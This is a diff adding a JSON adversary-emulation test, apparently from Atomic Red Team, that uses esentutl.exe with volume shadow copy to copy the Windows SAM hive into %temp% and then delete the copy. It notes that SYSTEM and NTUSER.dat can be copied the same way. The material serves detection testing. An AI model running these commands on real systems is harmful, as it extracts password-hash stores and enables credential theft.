@@ -1,0 +1,64 @@
+{
+  "id": "a90c2f4d-6726-444e-99d2-a00cd7c20480",
+  "name": "esentutl.exe SAM copy",
+  "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e5bc608b-a67e-4087-b3db-e34716dfd085",
+      "type": "execute-command",
+      "data": {
+        "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b2084e1a-7ea9-48e8-b320-188e7cd8f14f",
+      "type": "execute-command",
+      "data": {
+        "command": "del #{copy_dest}\\#{file_name} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e5bc608b-a67e-4087-b3db-e34716dfd085",
+      "p": "on-success",
+      "o": "b2084e1a-7ea9-48e8-b320-188e7cd8f14f"
+    },
+    {
+      "s": "e5bc608b-a67e-4087-b3db-e34716dfd085",
+      "p": "on-failure",
+      "o": "b2084e1a-7ea9-48e8-b320-188e7cd8f14f"
+    }
+  ],
+  "tags": [
+    "T1003.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_path",
+      "type": "path",
+      "description": "Path to the file to copy",
+      "value": "%SystemRoot%/system32/config/SAM"
+    },
+    {
+      "name": "file_name",
+      "type": "string",
+      "description": "Name of the copied file",
+      "value": "SAM"
+    },
+    {
+      "name": "copy_dest",
+      "type": "string",
+      "description": "Destination of the copied file",
+      "value": "%temp%"
+    }
+  ]
+}
